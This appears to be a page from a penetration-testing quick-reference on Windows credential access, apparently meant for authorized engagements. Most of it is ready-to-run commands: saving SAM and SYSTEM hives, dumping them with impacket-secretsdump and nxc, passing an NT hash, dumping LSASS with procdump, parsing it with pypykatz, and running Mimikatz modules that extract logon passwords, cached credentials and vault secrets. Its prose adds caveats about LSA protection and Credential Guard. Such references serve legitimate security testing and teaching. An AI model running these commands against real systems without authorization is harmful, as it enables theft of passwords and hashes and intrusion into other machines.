# Windows credential access

[← Windows quick reference](../04-windows-privesc.md) · [Credential hunting](credentials.md) · [NT hashes and NetNTLMv2](ntlm.md)

Match the method to confirmed local admin/SYSTEM, backup, or debug rights. Record the current identity and the source of any recovered material. For DC database access and directory replication, see [AD credential access](../ad/credential-access.md).

Local accounts' unsalted NT hashes reside in the SAM; direct copying of the live hive can fail because it is in use. An authorized `reg save`/offline extraction or Mimikatz dump is a different path from inducing a network challenge-response. LSASS handles logon material, but its contents depend on the logon type and Windows protections: administrative rights and `SeDebugPrivilege` do **not** guarantee readable credentials when LSA protection or Credential Guard is active. See [Windows credential checks](credentials.md) for registry-hive and credential sources.

## Local SAM and LSA

Local SAM/SYSTEM:

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
nxc smb <target-ip> -u <admin-user> -p '<password>' --sam --lsa
impacket-secretsdump -hashes :<nt-hash> '<domain.tld>/<admin-user>@<target-ip>'
```

## LSASS and cached material

Debug/SYSTEM → LSASS dump for offline parsing:

```cmd
procdump -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```

Interactive Mimikatz:

```text
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::cache
vault::cred
```

## Non-interactive Mimikatz

Administrator/SYSTEM under WinRM:

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

Run the quoted commands with `"exit"` under non-interactive WinRM; launching Mimikatz alone expects an interactive prompt. `privilege::debug` needs sufficient rights, and `token::elevate` only works if a usable token is available. An empty or protected LSASS result is not evidence that the user has no credentials. Do not rely on plaintext: WDigest plaintext caching is disabled by default on modern Windows, and Credential Guard/LSA protection may prevent memory access.

References: [Microsoft credential processes](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) · [LSA protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) · [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works).
